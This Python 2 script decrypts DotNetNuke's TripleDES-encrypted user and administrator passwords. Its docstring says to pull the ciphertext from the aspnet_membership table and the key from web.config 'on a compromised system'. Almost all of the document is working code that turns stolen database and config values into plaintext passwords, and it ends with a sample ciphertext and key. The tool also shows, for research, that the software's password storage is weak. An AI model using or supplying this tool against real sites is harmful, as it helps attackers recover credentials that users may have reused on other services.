#!/usr/bin/env python

"""dotnetnuker-0.1.py
9-1-2012
contact@nsa.sh

2-4-2019
realjesseshelley@gmail.com

This script will decrypt DotNetNuke TripleDES (DES3) encrypted user and 
administrative passwords. DNN uses DES3 with a 192 bit key for
default password storage. This means that all DNN passwords are
completely reversible.

On a compromised system, you will find the DES3 passphrase ciphertext
in the "aspnet_membership" table of the MSSQL database.

The decryption key is located in the DotNetNuke web.config file
found in the dnn root folder. It should be listed as the value
"decryptionkey" under <system.web>.

The DES3 implementation used by DotNetNuke uses PKCS7 for padding.
This is handled in the "strip_padding" function.

"""

from Crypto.Cipher import DES3
import binascii
from base64 import b64encode, b64decode

def decrypt_dnn_des3( encoded_ciphertext, key ):
  """Decrypt DES3 passphrase

  :Args:
  encoded_ciphertext -- Base64 Encoded Ciphertext
  key -- Decryption Key

  Returns decoded and decrypted passphrase.

  """
  BLOCKSIZE = 8  #  DES3 Blocksize is 8 Bytes
  ciphertext = b64decode(encoded_ciphertext)
  if len(ciphertext) % BLOCKSIZE != 0:
    print "Invalid ciphertext! Not a multiple of DES3 blocksize"

  key = binascii.unhexlify(key)
  decipher = DES3.new(key, DES3.MODE_CBC)
  password = decipher.decrypt(ciphertext)

  #  strip 16 byte salt with slice notation [16:]
  return strip_padding(password[16:])

def strip_padding( plaintext ):
  """Strip DES3 padding from passphrase

  :Args:
  plaintext -- decoded and decrypted passphrase.

  Returns passphrase without padding.

  """
  pad = ord(plaintext[-1])

  #  verify padding byte is really a padding byte
  if pad > 8:
    print "Padding byte is not a padding byte!"
    exit(1)
  
  for c in plaintext[-pad:]:
    if ord(c) != pad:
      print "Bad padding"
      exit(1)
 
  plaintext = plaintext[:-pad]

  return plaintext
 
# passphrase ciphertext from aspnet_members table
encoded_ciphertext = "8St3xb8NHhSVRof5I6TqZt6DMlPzM3M/uEFstxRNGit17VIX4UthWA=="
# 'decryptionkey' from web.config located in dnn root install
key = "B1F879A992A2F6BD98C68367C9D07AA2C16F454B5638847C"

print decrypt_dnn_des3(encoded_ciphertext, key)
